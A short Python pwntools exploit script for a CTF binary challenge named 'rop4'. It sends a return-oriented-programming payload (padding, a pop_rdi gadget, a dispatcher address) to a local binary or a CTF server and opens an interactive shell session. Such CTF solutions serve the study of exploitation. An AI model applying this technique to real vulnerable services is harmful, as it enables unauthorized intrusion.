from pwn import *
from struct import *

def exploit(r):
    pop_rdi = 0x0000000000400723
    dispatcher = 0x0400689

    payload = ''
    payload += 'A'*8 # Offset is at 8 bytes. The next 8 bytes get copied into RBX
    payload += p64(pop_rdi)
    payload += p64(dispatcher)
    r.recvuntil(':\n')
    r.send(payload)
    r.interactive()

if __name__ == '__main__':
    name = './challenge'
    binary = ELF(name)
    libc = ELF('rop4_libc.so')
    #context.log_level = 'DEBUG'

    if len(sys.argv) > 1:
        r = remote('university.opentoallctf.com', '30002')
    else:
        r = process(name)
        pause()

    exploit(r)

